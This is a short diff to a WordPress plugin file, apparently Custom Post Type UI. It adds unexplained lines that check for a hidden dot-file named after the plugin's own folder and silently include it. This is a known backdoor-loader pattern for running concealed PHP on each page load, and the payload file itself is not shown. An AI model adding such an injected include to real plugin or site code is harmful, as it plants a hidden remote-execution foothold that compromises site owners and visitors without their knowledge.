@@ -21,6 +21,10 @@ if ( ! defined( 'ABSPATH' ) ) {
  *
  * @since 1.6.0
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function cptui_listings_assets() {
 	$current_screen = get_current_screen();
 
